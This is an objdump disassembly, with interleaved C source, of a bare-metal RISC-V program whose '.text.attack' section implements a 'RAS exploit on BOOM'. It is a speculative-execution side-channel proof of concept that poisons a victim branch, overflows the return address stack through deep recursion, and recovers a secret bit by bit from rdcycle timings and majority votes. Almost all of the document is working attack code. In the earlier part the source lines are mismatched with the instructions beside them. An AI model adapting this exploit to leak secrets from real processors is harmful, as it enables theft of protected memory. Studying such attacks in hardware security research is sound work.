    80002600:	00001697          	auipc	a3,0x1
    80002604:	a0068693          	add	a3,a3,-1536 # 80003000 <pt>
    80002608:	20078793          	add	a5,a5,512
    8000260c:	00379793          	sll	a5,a5,0x3
    80002610:	00f687b3          	add	a5,a3,a5
    80002614:	00e7b023          	sd	a4,0(a5)
    secret_l3pt[0] = PPN(secret) | data_flag;
    80002618:	003fe797          	auipc	a5,0x3fe
    8000261c:	9e878793          	add	a5,a5,-1560 # 80400000 <secret>
    80002620:	00c7d793          	srl	a5,a5,0xc
    80002624:	00a79793          	sll	a5,a5,0xa
    80002628:	0c77e713          	or	a4,a5,199
    8000262c:	00001697          	auipc	a3,0x1
    80002630:	9d468693          	add	a3,a3,-1580 # 80003000 <pt>
    80002634:	000027b7          	lui	a5,0x2
    80002638:	00f687b3          	add	a5,a3,a5
    8000263c:	00e7b023          	sd	a4,0(a5) # 2000 <threadsense.2+0x1f7c>

    /**********************************************/

    uintptr_t vm_choice = SATP_MODE_CHOICE;
    80002640:	00800793          	li	a5,8
    80002644:	fef43423          	sd	a5,-24(s0)
    uintptr_t satp_value = ((uintptr_t)l1pt >> PGSHIFT)
                          | (vm_choice * (SATP_MODE & ~(SATP_MODE<<1)));
    80002648:	fe843783          	ld	a5,-24(s0)
    8000264c:	03c79713          	sll	a4,a5,0x3c
    uintptr_t satp_value = ((uintptr_t)l1pt >> PGSHIFT)
    80002650:	00001797          	auipc	a5,0x1
    80002654:	9b078793          	add	a5,a5,-1616 # 80003000 <pt>
    80002658:	00c7d793          	srl	a5,a5,0xc
    8000265c:	00f767b3          	or	a5,a4,a5
    80002660:	fef43023          	sd	a5,-32(s0)

    write_csr(satp, satp_value);
    80002664:	fe043783          	ld	a5,-32(s0)
    80002668:	18079073          	csrw	satp,a5
    write_csr(medeleg,
    8000266c:	0000b7b7          	lui	a5,0xb
    80002670:	1557879b          	addw	a5,a5,341 # b155 <threadsense.2+0xb0d1>
    80002674:	30279073          	csrw	medeleg,a5
              (1 << CAUSE_USER_ECALL) |
              (1 << CAUSE_FETCH_PAGE_FAULT) |
              (1 << CAUSE_LOAD_PAGE_FAULT) |
              (1 << CAUSE_STORE_PAGE_FAULT));

    asm volatile("sfence.vma zero, zero");
    80002678:	12000073          	sfence.vma

    return;
    8000267c:	00000013          	nop
}
    80002680:	01813403          	ld	s0,24(sp)
    80002684:	02010113          	add	sp,sp,32
    80002688:	00008067          	ret

000000008000268c <printArray>:
        "fdiv.s fa5, fa5, fa4\n"
        "fdiv.s fa5, fa5, fa4\n"
        "fdiv.s fa5, fa5, fa4\n"
        "fdiv.s fa5, fa5, fa4\n"
        "fcvt.lu.s    %[out], fa5, rtz\n"
        : [out]"=r"(tobe1)
    8000268c:	fd010113          	add	sp,sp,-48
    80002690:	02813423          	sd	s0,40(sp)
    80002694:	03010413          	add	s0,sp,48
    80002698:	fea43423          	sd	a0,-24(s0)
    8000269c:	00058793          	mv	a5,a1
    800026a0:	fcc43c23          	sd	a2,-40(s0)
    800026a4:	fef42223          	sw	a5,-28(s0)

    if (mustbe0 < tobe1) {
        if (v == 1) {
            infinite();
        }
    } else {
    800026a8:	00000013          	nop
    800026ac:	02813403          	ld	s0,40(sp)
    800026b0:	03010113          	add	sp,sp,48
    800026b4:	00008067          	ret

00000000800026b8 <printDoubleArray>:
        return;
    }

    800026b8:	fd010113          	add	sp,sp,-48
    800026bc:	02813423          	sd	s0,40(sp)
    800026c0:	03010413          	add	s0,sp,48
    800026c4:	fea43423          	sd	a0,-24(s0)
    800026c8:	00058793          	mv	a5,a1
    800026cc:	fcc43c23          	sd	a2,-40(s0)
    800026d0:	fef42223          	sw	a5,-28(s0)

void infinite() {
    infinite();
    /* if (i == 0) */
    /*     return; */
    /* i--; */
    800026d4:	00000013          	nop
    800026d8:	02813403          	ld	s0,40(sp)
    800026dc:	03010113          	add	sp,sp,48
    800026e0:	00008067          	ret

00000000800026e4 <verify>:

    /* infinite(i); */
    /* return; */
    800026e4:	fb010113          	add	sp,sp,-80
    800026e8:	04813423          	sd	s0,72(sp)
    800026ec:	05010413          	add	s0,sp,80
    800026f0:	00050793          	mv	a5,a0
    800026f4:	fcb43023          	sd	a1,-64(s0)
    800026f8:	fac43c23          	sd	a2,-72(s0)
    800026fc:	fcf42623          	sw	a5,-52(s0)
}

uint64_t nested(uint64_t i, uint64_t idx) {
    80002700:	fe042623          	sw	zero,-20(s0)
    80002704:	0c80006f          	j	800027cc <verify+0xe8>
    uint64_t cycle;

    80002708:	fec42783          	lw	a5,-20(s0)
    8000270c:	00279793          	sll	a5,a5,0x2
    80002710:	fc043703          	ld	a4,-64(s0)
    80002714:	00f707b3          	add	a5,a4,a5
    80002718:	0007a783          	lw	a5,0(a5)
    8000271c:	fef42423          	sw	a5,-24(s0)
    80002720:	fec42783          	lw	a5,-20(s0)
    80002724:	00178793          	add	a5,a5,1
    80002728:	00279793          	sll	a5,a5,0x2
    8000272c:	fc043703          	ld	a4,-64(s0)
    80002730:	00f707b3          	add	a5,a4,a5
    80002734:	0007a783          	lw	a5,0(a5)
    80002738:	fef42223          	sw	a5,-28(s0)
    if (i == 0) {
    8000273c:	fec42783          	lw	a5,-20(s0)
    80002740:	00279793          	sll	a5,a5,0x2
    80002744:	fb843703          	ld	a4,-72(s0)
    80002748:	00f707b3          	add	a5,a4,a5
    8000274c:	0007a783          	lw	a5,0(a5)
    80002750:	fef42023          	sw	a5,-32(s0)
    80002754:	fec42783          	lw	a5,-20(s0)
    80002758:	00178793          	add	a5,a5,1
    8000275c:	00279793          	sll	a5,a5,0x2
    80002760:	fb843703          	ld	a4,-72(s0)
    80002764:	00f707b3          	add	a5,a4,a5
    80002768:	0007a783          	lw	a5,0(a5)
    8000276c:	fcf42e23          	sw	a5,-36(s0)
        victim(1, idx);
    80002770:	fe842783          	lw	a5,-24(s0)
    80002774:	00078713          	mv	a4,a5
    80002778:	fe042783          	lw	a5,-32(s0)
    8000277c:	0007071b          	sext.w	a4,a4
    80002780:	0007879b          	sext.w	a5,a5
    80002784:	00f70a63          	beq	a4,a5,80002798 <verify+0xb4>
    80002788:	fec42783          	lw	a5,-20(s0)
    8000278c:	0017879b          	addw	a5,a5,1
    80002790:	0007879b          	sext.w	a5,a5
    80002794:	0b80006f          	j	8000284c <verify+0x168>

    80002798:	fe442783          	lw	a5,-28(s0)
    8000279c:	00078713          	mv	a4,a5
    800027a0:	fdc42783          	lw	a5,-36(s0)
    800027a4:	0007071b          	sext.w	a4,a4
    800027a8:	0007879b          	sext.w	a5,a5
    800027ac:	00f70a63          	beq	a4,a5,800027c0 <verify+0xdc>
    800027b0:	fec42783          	lw	a5,-20(s0)
    800027b4:	0027879b          	addw	a5,a5,2
    800027b8:	0007879b          	sext.w	a5,a5
    800027bc:	0900006f          	j	8000284c <verify+0x168>
uint64_t nested(uint64_t i, uint64_t idx) {
    800027c0:	fec42783          	lw	a5,-20(s0)
    800027c4:	0027879b          	addw	a5,a5,2
    800027c8:	fef42623          	sw	a5,-20(s0)
    800027cc:	fcc42783          	lw	a5,-52(s0)
    800027d0:	01f7d71b          	srlw	a4,a5,0x1f
    800027d4:	00f707bb          	addw	a5,a4,a5
    800027d8:	4017d79b          	sraw	a5,a5,0x1
    800027dc:	0007879b          	sext.w	a5,a5
    800027e0:	0017979b          	sllw	a5,a5,0x1
    800027e4:	0007871b          	sext.w	a4,a5
    800027e8:	fec42783          	lw	a5,-20(s0)
    800027ec:	0007879b          	sext.w	a5,a5
    800027f0:	f0e7cce3          	blt	a5,a4,80002708 <verify+0x24>
        asm volatile("csrr %0, cycle"
                     : "=r"(cycle));
    800027f4:	fcc42783          	lw	a5,-52(s0)
    800027f8:	0017f793          	and	a5,a5,1
    800027fc:	0007879b          	sext.w	a5,a5
    80002800:	04078463          	beqz	a5,80002848 <verify+0x164>
    80002804:	fcc42783          	lw	a5,-52(s0)
    80002808:	00279793          	sll	a5,a5,0x2
    8000280c:	ffc78793          	add	a5,a5,-4
    80002810:	fc043703          	ld	a4,-64(s0)
    80002814:	00f707b3          	add	a5,a4,a5
    80002818:	0007a783          	lw	a5,0(a5)
    8000281c:	0007869b          	sext.w	a3,a5
    80002820:	fcc42783          	lw	a5,-52(s0)
    80002824:	00279793          	sll	a5,a5,0x2
    80002828:	ffc78793          	add	a5,a5,-4
    8000282c:	fb843703          	ld	a4,-72(s0)
    80002830:	00f707b3          	add	a5,a4,a5
    80002834:	0007a783          	lw	a5,0(a5)
    80002838:	00068713          	mv	a4,a3
    8000283c:	00f70663          	beq	a4,a5,80002848 <verify+0x164>
        return cycle;
    80002840:	fcc42783          	lw	a5,-52(s0)
    80002844:	0080006f          	j	8000284c <verify+0x168>
    }
    80002848:	00000793          	li	a5,0
    i--;
    8000284c:	00078513          	mv	a0,a5
    80002850:	04813403          	ld	s0,72(sp)
    80002854:	05010113          	add	sp,sp,80
    80002858:	00008067          	ret

000000008000285c <verifyDouble>:

    cycle = nested(i, idx);
    return cycle;
    8000285c:	fa010113          	add	sp,sp,-96
    80002860:	04813c23          	sd	s0,88(sp)
    80002864:	06010413          	add	s0,sp,96
    80002868:	00050793          	mv	a5,a0
    8000286c:	fab43823          	sd	a1,-80(s0)
    80002870:	fac43423          	sd	a2,-88(s0)
    80002874:	faf42e23          	sw	a5,-68(s0)
}

int main(void) {
    80002878:	fe042623          	sw	zero,-20(s0)
    8000287c:	0dc0006f          	j	80002958 <verifyDouble+0xfc>
    uint64_t sec = 0xdeadbeef;
    uint8_t bits[S_WORD] = {0, };
    80002880:	fec42783          	lw	a5,-20(s0)
    80002884:	00379793          	sll	a5,a5,0x3
    80002888:	fb043703          	ld	a4,-80(s0)
    8000288c:	00f707b3          	add	a5,a4,a5
    80002890:	0007b787          	fld	fa5,0(a5)
    80002894:	fef43027          	fsd	fa5,-32(s0)
    80002898:	fec42783          	lw	a5,-20(s0)
    8000289c:	00178793          	add	a5,a5,1
    800028a0:	00379793          	sll	a5,a5,0x3
    800028a4:	fb043703          	ld	a4,-80(s0)
    800028a8:	00f707b3          	add	a5,a4,a5
    800028ac:	0007b787          	fld	fa5,0(a5)
    800028b0:	fcf43c27          	fsd	fa5,-40(s0)
    uint8_t votes[S_WORD] = {0, };
    800028b4:	fec42783          	lw	a5,-20(s0)
    800028b8:	00379793          	sll	a5,a5,0x3
    800028bc:	fa843703          	ld	a4,-88(s0)
    800028c0:	00f707b3          	add	a5,a4,a5
    800028c4:	0007b787          	fld	fa5,0(a5)
    800028c8:	fcf43827          	fsd	fa5,-48(s0)
    800028cc:	fec42783          	lw	a5,-20(s0)
    800028d0:	00178793          	add	a5,a5,1
    800028d4:	00379793          	sll	a5,a5,0x3
    800028d8:	fa843703          	ld	a4,-88(s0)
    800028dc:	00f707b3          	add	a5,a4,a5
    800028e0:	0007b787          	fld	fa5,0(a5)
    800028e4:	fcf43427          	fsd	fa5,-56(s0)

    800028e8:	fe043707          	fld	fa4,-32(s0)
    800028ec:	fd043787          	fld	fa5,-48(s0)
    800028f0:	a2f727d3          	feq.d	a5,fa4,fa5
    800028f4:	00f037b3          	snez	a5,a5
    800028f8:	0ff7f793          	zext.b	a5,a5
    800028fc:	fcf42223          	sw	a5,-60(s0)
    80002900:	fd843707          	fld	fa4,-40(s0)
    80002904:	fc843787          	fld	fa5,-56(s0)
    80002908:	a2f727d3          	feq.d	a5,fa4,fa5
    8000290c:	00f037b3          	snez	a5,a5
    80002910:	0ff7f793          	zext.b	a5,a5
    80002914:	fcf42023          	sw	a5,-64(s0)
    uint64_t start, end;
    80002918:	fc442783          	lw	a5,-60(s0)
    8000291c:	00078713          	mv	a4,a5
    80002920:	fc042783          	lw	a5,-64(s0)
    80002924:	00f777b3          	and	a5,a4,a5
    80002928:	0007879b          	sext.w	a5,a5
    8000292c:	02079063          	bnez	a5,8000294c <verifyDouble+0xf0>
    80002930:	fec42783          	lw	a5,-20(s0)
    80002934:	0017879b          	addw	a5,a5,1
    80002938:	0007879b          	sext.w	a5,a5
    8000293c:	fc442703          	lw	a4,-60(s0)
    80002940:	00f707bb          	addw	a5,a4,a5
    80002944:	0007879b          	sext.w	a5,a5
    80002948:	08c0006f          	j	800029d4 <verifyDouble+0x178>
int main(void) {
    8000294c:	fec42783          	lw	a5,-20(s0)
    80002950:	0027879b          	addw	a5,a5,2
    80002954:	fef42623          	sw	a5,-20(s0)
    80002958:	fbc42783          	lw	a5,-68(s0)
    8000295c:	01f7d71b          	srlw	a4,a5,0x1f
    80002960:	00f707bb          	addw	a5,a4,a5
    80002964:	4017d79b          	sraw	a5,a5,0x1
    80002968:	0007879b          	sext.w	a5,a5
    8000296c:	0017979b          	sllw	a5,a5,0x1
    80002970:	0007871b          	sext.w	a4,a5
    80002974:	fec42783          	lw	a5,-20(s0)
    80002978:	0007879b          	sext.w	a5,a5
    8000297c:	f0e7c2e3          	blt	a5,a4,80002880 <verifyDouble+0x24>

    printf("[*] RAS exploit on BOOM\n");
    80002980:	fbc42783          	lw	a5,-68(s0)
    80002984:	0017f793          	and	a5,a5,1
    80002988:	0007879b          	sext.w	a5,a5
    8000298c:	04078263          	beqz	a5,800029d0 <verifyDouble+0x174>
    80002990:	fbc42783          	lw	a5,-68(s0)
    80002994:	00379793          	sll	a5,a5,0x3
    80002998:	ff878793          	add	a5,a5,-8
    8000299c:	fb043703          	ld	a4,-80(s0)
    800029a0:	00f707b3          	add	a5,a4,a5
    800029a4:	0007b707          	fld	fa4,0(a5)
    800029a8:	fbc42783          	lw	a5,-68(s0)
    800029ac:	00379793          	sll	a5,a5,0x3
    800029b0:	ff878793          	add	a5,a5,-8
    800029b4:	fa843703          	ld	a4,-88(s0)
    800029b8:	00f707b3          	add	a5,a4,a5
    800029bc:	0007b787          	fld	fa5,0(a5)
    800029c0:	a2f727d3          	feq.d	a5,fa4,fa5
    800029c4:	00079663          	bnez	a5,800029d0 <verifyDouble+0x174>

    800029c8:	fbc42783          	lw	a5,-68(s0)
    800029cc:	0080006f          	j	800029d4 <verifyDouble+0x178>
    for (int idx = S_WORD - 1; idx >= 0; idx--) {
    800029d0:	00000793          	li	a5,0
        printf("[%2d] Want(%d) Cycles: ", idx, (int) ((sec >> idx) & 1));
    800029d4:	00078513          	mv	a0,a5
    800029d8:	05813403          	ld	s0,88(sp)
    800029dc:	06010113          	add	sp,sp,96
    800029e0:	00008067          	ret

00000000800029e4 <barrier>:
        uint64_t cycles[TRIAL] = {0, };
        for (int t = 0; t < TRIAL; t++) {

    800029e4:	fe010113          	add	sp,sp,-32
    800029e8:	00813c23          	sd	s0,24(sp)
    800029ec:	02010413          	add	s0,sp,32
    800029f0:	00050793          	mv	a5,a0
    800029f4:	fef42623          	sw	a5,-20(s0)
            /* Poison branch in victim */
            for (int i = 0; i < 5; i++)
                victim(0, 0);

            start = nested(64, idx);
    800029f8:	0ff0000f          	fence
            asm volatile("csrr %0, cycle"
                         : "=r"(end));
    800029fc:	08422783          	lw	a5,132(tp) # 84 <threadsense.2>
    80002a00:	0017b793          	seqz	a5,a5
    80002a04:	0ff7f793          	zext.b	a5,a5
    80002a08:	0007871b          	sext.w	a4,a5
    80002a0c:	08e22223          	sw	a4,132(tp) # 84 <threadsense.2>
            cycles[t] = end - start;
    80002a10:	00003797          	auipc	a5,0x3
    80002a14:	5f078793          	add	a5,a5,1520 # 80006000 <count.1>
    80002a18:	00100713          	li	a4,1
    80002a1c:	0f50000f          	fence	iorw,ow
    80002a20:	04e7a6af          	amoadd.w.aq	a3,a4,(a5)
    80002a24:	0006879b          	sext.w	a5,a3
    80002a28:	0007871b          	sext.w	a4,a5
    80002a2c:	fec42783          	lw	a5,-20(s0)
    80002a30:	fff7879b          	addw	a5,a5,-1
    80002a34:	0007879b          	sext.w	a5,a5
    80002a38:	02f71263          	bne	a4,a5,80002a5c <barrier+0x78>
            printf("%4ld ", cycles[t]);
        }
    80002a3c:	00003797          	auipc	a5,0x3
    80002a40:	5c478793          	add	a5,a5,1476 # 80006000 <count.1>
    80002a44:	0007a023          	sw	zero,0(a5)

    80002a48:	08422703          	lw	a4,132(tp) # 84 <threadsense.2>
    80002a4c:	00003797          	auipc	a5,0x3
    80002a50:	5b878793          	add	a5,a5,1464 # 80006004 <sense.0>
    80002a54:	00e7a023          	sw	a4,0(a5)
    80002a58:	0200006f          	j	80002a78 <barrier+0x94>
        int sum = 0;
        for (int t = 0; t < TRIAL; t++) {
    80002a5c:	00000013          	nop
    80002a60:	00003797          	auipc	a5,0x3
    80002a64:	5a478793          	add	a5,a5,1444 # 80006004 <sense.0>
    80002a68:	0007a783          	lw	a5,0(a5)
    80002a6c:	0007871b          	sext.w	a4,a5
    80002a70:	08422783          	lw	a5,132(tp) # 84 <threadsense.2>
    80002a74:	fef716e3          	bne	a4,a5,80002a60 <barrier+0x7c>
            if (cycles[t] > 560)
                sum++;
        }
    80002a78:	0ff0000f          	fence

    80002a7c:	00000013          	nop
    80002a80:	01813403          	ld	s0,24(sp)
    80002a84:	02010113          	add	sp,sp,32
    80002a88:	00008067          	ret

0000000080002a8c <lfsr>:
        bits[idx] = (sum > TRIAL/2)? 1:0;
        votes[idx] = (sum > TRIAL/2)? sum: TRIAL - sum;

    80002a8c:	fd010113          	add	sp,sp,-48
    80002a90:	02813423          	sd	s0,40(sp)
    80002a94:	03010413          	add	s0,sp,48
    80002a98:	fca43c23          	sd	a0,-40(s0)
        printf(" --> %d (%d/%d)\n", bits[idx], votes[idx], TRIAL);
    80002a9c:	fd843783          	ld	a5,-40(s0)
    80002aa0:	0017d713          	srl	a4,a5,0x1
    80002aa4:	fd843783          	ld	a5,-40(s0)
    80002aa8:	00f747b3          	xor	a5,a4,a5
    80002aac:	0017f793          	and	a5,a5,1
    80002ab0:	fef43423          	sd	a5,-24(s0)
    }
    80002ab4:	fd843783          	ld	a5,-40(s0)
    80002ab8:	0017d713          	srl	a4,a5,0x1
    80002abc:	fe843783          	ld	a5,-24(s0)
    80002ac0:	03e79793          	sll	a5,a5,0x3e
    80002ac4:	00f767b3          	or	a5,a4,a5

    80002ac8:	00078513          	mv	a0,a5
    80002acc:	02813403          	ld	s0,40(sp)
    80002ad0:	03010113          	add	sp,sp,48
    80002ad4:	00008067          	ret

0000000080002ad8 <lfsr10>:
    // printf("[*] Secret: 0x");
    // for (int idx = S_WORD - 4; idx >= 0; idx-=4) {
    //     uint16_t hex = bits[idx+3] << 3 | bits[idx+2] << 2 | bits[idx+1] << 1 | bits[idx];
    80002ad8:	fd010113          	add	sp,sp,-48
    80002adc:	02813423          	sd	s0,40(sp)
    80002ae0:	03010413          	add	s0,sp,48
    80002ae4:	fca43c23          	sd	a0,-40(s0)
    //     printf("%x", hex);
    80002ae8:	fd843783          	ld	a5,-40(s0)
    80002aec:	00a7d713          	srl	a4,a5,0xa
    80002af0:	fd843783          	ld	a5,-40(s0)
    80002af4:	00f747b3          	xor	a5,a4,a5
    80002af8:	3ff7f793          	and	a5,a5,1023
    80002afc:	fef43423          	sd	a5,-24(s0)
    // }
    80002b00:	fd843783          	ld	a5,-40(s0)
    80002b04:	00a7d713          	srl	a4,a5,0xa
    80002b08:	fe843783          	ld	a5,-24(s0)
    80002b0c:	03579793          	sll	a5,a5,0x35
    80002b10:	00f767b3          	or	a5,a4,a5
    // printf("\n");
    80002b14:	00078513          	mv	a0,a5
    80002b18:	02813403          	ld	s0,40(sp)
    80002b1c:	03010113          	add	sp,sp,48
    80002b20:	00008067          	ret

Disassembly of section .text.attack:

0000000080200000 <attack>:

    .section ".text.attack"
    .global attack
    .align 2
attack:
    call main
    80200000:	16c000ef          	jal	8020016c <main>

0000000080200004 <attack_end>:
attack_end:
    la t0, stvec_handler
    80200004:	ffe00297          	auipc	t0,0xffe00
    80200008:	01828293          	add	t0,t0,24 # 8000001c <stvec_handler>
    jr t0
    8020000c:	00028067          	jr	t0

0000000080200010 <victim>:
void victim(uint64_t mustbe0, uint64_t idx) {
    80200010:	fc010113          	add	sp,sp,-64
    80200014:	02113c23          	sd	ra,56(sp)
    80200018:	02813823          	sd	s0,48(sp)
    8020001c:	04010413          	add	s0,sp,64
    80200020:	fca43423          	sd	a0,-56(s0)
    80200024:	fcb43023          	sd	a1,-64(s0)
    volatile uint64_t s = (uint64_t) (*(uint64_t *) secret);
    80200028:	00200797          	auipc	a5,0x200
    8020002c:	fd878793          	add	a5,a5,-40 # 80400000 <secret>
    80200030:	0007b783          	ld	a5,0(a5)
    80200034:	fef43423          	sd	a5,-24(s0)
    volatile uint64_t tobe1 = 16, two = 2;
    80200038:	01000793          	li	a5,16
    8020003c:	fef43023          	sd	a5,-32(s0)
    80200040:	00200793          	li	a5,2
    80200044:	fcf43c23          	sd	a5,-40(s0)
    volatile uint64_t v = ((((-mustbe0) & s) >> idx) & 1);
    80200048:	fc843783          	ld	a5,-56(s0)
    8020004c:	40f00733          	neg	a4,a5
    80200050:	fe843783          	ld	a5,-24(s0)
    80200054:	00f777b3          	and	a5,a4,a5
    80200058:	fc043703          	ld	a4,-64(s0)
    8020005c:	0007071b          	sext.w	a4,a4
    80200060:	00e7d7b3          	srl	a5,a5,a4
    80200064:	0017f793          	and	a5,a5,1
    80200068:	fcf43823          	sd	a5,-48(s0)
    asm("fence\n"
    8020006c:	fe043783          	ld	a5,-32(s0)
    80200070:	fd843703          	ld	a4,-40(s0)
    80200074:	0ff0000f          	fence
    80200078:	d0377753          	fcvt.s.lu	fa4,a4
    8020007c:	d037f7d3          	fcvt.s.lu	fa5,a5
    80200080:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80200084:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80200088:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    8020008c:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80200090:	c03797d3          	fcvt.lu.s	a5,fa5,rtz
    80200094:	fef43023          	sd	a5,-32(s0)
    if (mustbe0 < tobe1) {
    80200098:	fe043783          	ld	a5,-32(s0)
    8020009c:	fc843703          	ld	a4,-56(s0)
    802000a0:	00f77c63          	bgeu	a4,a5,802000b8 <victim+0xa8>
        if (v == 1) {
    802000a4:	fd043703          	ld	a4,-48(s0)
    802000a8:	00100793          	li	a5,1
    802000ac:	00f71a63          	bne	a4,a5,802000c0 <victim+0xb0>
            infinite();
    802000b0:	024000ef          	jal	802000d4 <infinite>
    return;
    802000b4:	00c0006f          	j	802000c0 <victim+0xb0>
        return;
    802000b8:	00000013          	nop
    802000bc:	0080006f          	j	802000c4 <victim+0xb4>
    return;
    802000c0:	00000013          	nop
}
    802000c4:	03813083          	ld	ra,56(sp)
    802000c8:	03013403          	ld	s0,48(sp)
    802000cc:	04010113          	add	sp,sp,64
    802000d0:	00008067          	ret

00000000802000d4 <infinite>:
void infinite() {
    802000d4:	ff010113          	add	sp,sp,-16
    802000d8:	00113423          	sd	ra,8(sp)
    802000dc:	00813023          	sd	s0,0(sp)
    802000e0:	01010413          	add	s0,sp,16
    infinite();
    802000e4:	ff1ff0ef          	jal	802000d4 <infinite>
}
    802000e8:	00000013          	nop
    802000ec:	00813083          	ld	ra,8(sp)
    802000f0:	00013403          	ld	s0,0(sp)
    802000f4:	01010113          	add	sp,sp,16
    802000f8:	00008067          	ret

00000000802000fc <nested>:
uint64_t nested(uint64_t i, uint64_t idx) {
    802000fc:	fd010113          	add	sp,sp,-48
    80200100:	02113423          	sd	ra,40(sp)
    80200104:	02813023          	sd	s0,32(sp)
    80200108:	03010413          	add	s0,sp,48
    8020010c:	fca43c23          	sd	a0,-40(s0)
    80200110:	fcb43823          	sd	a1,-48(s0)
    if (i == 0) {
    80200114:	fd843783          	ld	a5,-40(s0)
    80200118:	02079063          	bnez	a5,80200138 <nested+0x3c>
        victim(1, idx);
    8020011c:	fd043583          	ld	a1,-48(s0)
    80200120:	00100513          	li	a0,1
    80200124:	eedff0ef          	jal	80200010 <victim>
        asm volatile("csrr %0, cycle"
    80200128:	c00027f3          	rdcycle	a5
    8020012c:	fef43423          	sd	a5,-24(s0)
        return cycle;
    80200130:	fe843783          	ld	a5,-24(s0)
    80200134:	0240006f          	j	80200158 <nested+0x5c>
    i--;
    80200138:	fd843783          	ld	a5,-40(s0)
    8020013c:	fff78793          	add	a5,a5,-1
    80200140:	fcf43c23          	sd	a5,-40(s0)
    cycle = nested(i, idx);
    80200144:	fd043583          	ld	a1,-48(s0)
    80200148:	fd843503          	ld	a0,-40(s0)
    8020014c:	fb1ff0ef          	jal	802000fc <nested>
    80200150:	fea43423          	sd	a0,-24(s0)
    return cycle;
    80200154:	fe843783          	ld	a5,-24(s0)
}
    80200158:	00078513          	mv	a0,a5
    8020015c:	02813083          	ld	ra,40(sp)
    80200160:	02013403          	ld	s0,32(sp)
    80200164:	03010113          	add	sp,sp,48
    80200168:	00008067          	ret

000000008020016c <main>:
int main(void) {
    8020016c:	f4010113          	add	sp,sp,-192
    80200170:	0a113c23          	sd	ra,184(sp)
    80200174:	0a813823          	sd	s0,176(sp)
    80200178:	0c010413          	add	s0,sp,192
    uint64_t sec = 0xdeadbeef;
    8020017c:	37ab77b7          	lui	a5,0x37ab7
    80200180:	00279793          	sll	a5,a5,0x2
    80200184:	eef78793          	add	a5,a5,-273 # 37ab6eef <threadsense.2+0x37ab6e6b>
    80200188:	fcf43823          	sd	a5,-48(s0)
    uint8_t bits[S_WORD] = {0, };
    8020018c:	f8043423          	sd	zero,-120(s0)
    80200190:	f8043823          	sd	zero,-112(s0)
    80200194:	f8043c23          	sd	zero,-104(s0)
    80200198:	fa043023          	sd	zero,-96(s0)
    uint8_t votes[S_WORD] = {0, };
    8020019c:	f6043423          	sd	zero,-152(s0)
    802001a0:	f6043823          	sd	zero,-144(s0)
    802001a4:	f6043c23          	sd	zero,-136(s0)
    802001a8:	f8043023          	sd	zero,-128(s0)
    printf("[*] RAS exploit on BOOM\n");
    802001ac:	00000517          	auipc	a0,0x0
    802001b0:	3dc50513          	add	a0,a0,988 # 80200588 <main+0x41c>
    802001b4:	ffe02097          	auipc	ra,0xffe02
    802001b8:	d14080e7          	jalr	-748(ra) # 80001ec8 <printf>
    for (int idx = S_WORD - 1; idx >= 0; idx--) {
    802001bc:	01f00793          	li	a5,31
    802001c0:	fef42623          	sw	a5,-20(s0)
    802001c4:	2100006f          	j	802003d4 <main+0x268>
        printf("[%2d] Want(%d) Cycles: ", idx, (int) ((sec >> idx) & 1));
    802001c8:	fec42783          	lw	a5,-20(s0)
    802001cc:	00078713          	mv	a4,a5
    802001d0:	fd043783          	ld	a5,-48(s0)
    802001d4:	00e7d7b3          	srl	a5,a5,a4
    802001d8:	0007879b          	sext.w	a5,a5
    802001dc:	0017f793          	and	a5,a5,1
    802001e0:	0007871b          	sext.w	a4,a5
    802001e4:	fec42783          	lw	a5,-20(s0)
    802001e8:	00070613          	mv	a2,a4
    802001ec:	00078593          	mv	a1,a5
    802001f0:	00000517          	auipc	a0,0x0
    802001f4:	3b850513          	add	a0,a0,952 # 802005a8 <main+0x43c>
    802001f8:	ffe02097          	auipc	ra,0xffe02
    802001fc:	cd0080e7          	jalr	-816(ra) # 80001ec8 <printf>
        uint64_t cycles[TRIAL] = {0, };
    80200200:	f4043023          	sd	zero,-192(s0)
    80200204:	f4043423          	sd	zero,-184(s0)
    80200208:	f4043823          	sd	zero,-176(s0)
    8020020c:	f4043c23          	sd	zero,-168(s0)
    80200210:	f6043023          	sd	zero,-160(s0)
        for (int t = 0; t < TRIAL; t++) {
    80200214:	fe042423          	sw	zero,-24(s0)
    80200218:	0a40006f          	j	802002bc <main+0x150>
            for (int i = 0; i < 5; i++)
    8020021c:	fe042223          	sw	zero,-28(s0)
    80200220:	01c0006f          	j	8020023c <main+0xd0>
                victim(0, 0);
    80200224:	00000593          	li	a1,0
    80200228:	00000513          	li	a0,0
    8020022c:	de5ff0ef          	jal	80200010 <victim>
            for (int i = 0; i < 5; i++)
    80200230:	fe442783          	lw	a5,-28(s0)
    80200234:	0017879b          	addw	a5,a5,1
    80200238:	fef42223          	sw	a5,-28(s0)
    8020023c:	fe442783          	lw	a5,-28(s0)
    80200240:	0007871b          	sext.w	a4,a5
    80200244:	00400793          	li	a5,4
    80200248:	fce7dee3          	bge	a5,a4,80200224 <main+0xb8>
            start = nested(64, idx);
    8020024c:	fec42783          	lw	a5,-20(s0)
    80200250:	00078593          	mv	a1,a5
    80200254:	04000513          	li	a0,64
    80200258:	ea5ff0ef          	jal	802000fc <nested>
    8020025c:	faa43823          	sd	a0,-80(s0)
            asm volatile("csrr %0, cycle"
    80200260:	c00027f3          	rdcycle	a5
    80200264:	faf43423          	sd	a5,-88(s0)
            cycles[t] = end - start;
    80200268:	fa843703          	ld	a4,-88(s0)
    8020026c:	fb043783          	ld	a5,-80(s0)
    80200270:	40f70733          	sub	a4,a4,a5
    80200274:	fe842783          	lw	a5,-24(s0)
    80200278:	00379793          	sll	a5,a5,0x3
    8020027c:	ff078793          	add	a5,a5,-16
    80200280:	008787b3          	add	a5,a5,s0
    80200284:	f4e7b823          	sd	a4,-176(a5)
            printf("%4ld ", cycles[t]);
    80200288:	fe842783          	lw	a5,-24(s0)
    8020028c:	00379793          	sll	a5,a5,0x3
    80200290:	ff078793          	add	a5,a5,-16
    80200294:	008787b3          	add	a5,a5,s0
    80200298:	f507b783          	ld	a5,-176(a5)
    8020029c:	00078593          	mv	a1,a5
    802002a0:	00000517          	auipc	a0,0x0
    802002a4:	32050513          	add	a0,a0,800 # 802005c0 <main+0x454>
    802002a8:	ffe02097          	auipc	ra,0xffe02
    802002ac:	c20080e7          	jalr	-992(ra) # 80001ec8 <printf>
        for (int t = 0; t < TRIAL; t++) {
    802002b0:	fe842783          	lw	a5,-24(s0)
    802002b4:	0017879b          	addw	a5,a5,1
